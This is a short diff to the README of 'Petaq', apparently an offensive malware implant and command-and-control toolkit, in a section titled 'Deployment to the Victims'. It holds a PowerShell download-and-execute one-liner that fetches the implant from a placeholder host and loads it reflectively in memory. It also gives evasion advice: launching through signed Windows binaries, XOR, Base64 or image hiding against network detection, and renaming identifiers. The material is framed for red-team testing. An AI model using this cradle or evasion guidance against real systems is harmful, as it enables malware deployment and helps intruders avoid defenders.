@@ -52,9 +52,10 @@ The malware needs to be compiled using .NET Framework as it has inline .NET comp
 
 # Deployment to the Victims
 Even though it's too noisy, running the following Powershell line would load the compiled Petaq Implant as reflected assembly for testing. You can compile the Petaq Implant as above, then place it into the wwwroot folder of Petaq Service as index.html. So the url would point to the binary to load directly.
+```
 powershell –c $m=new-object net.webclient;$Url='http://PETAQIMPLANTHOSTEDSITE/';$dba=$m.downloaddata($Url);$a=[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))
-
-I suggest you to some operational security measures for any production or evasive testing. 
+```
+I suggest you to consider some operational security measures for any production or evasive testing. 
 * Consider InstallUtil, Regsvr32, RegAsm, DotNettoJs, RunDLL32, WMI or MSBuild for evasive initial execution.
 * Consider using XOR for the implant to convert, Base64 encoding or hiding it in an image file to avoid network detections.
 * Consider replacing some Petaq words in the source code. Even though currently 
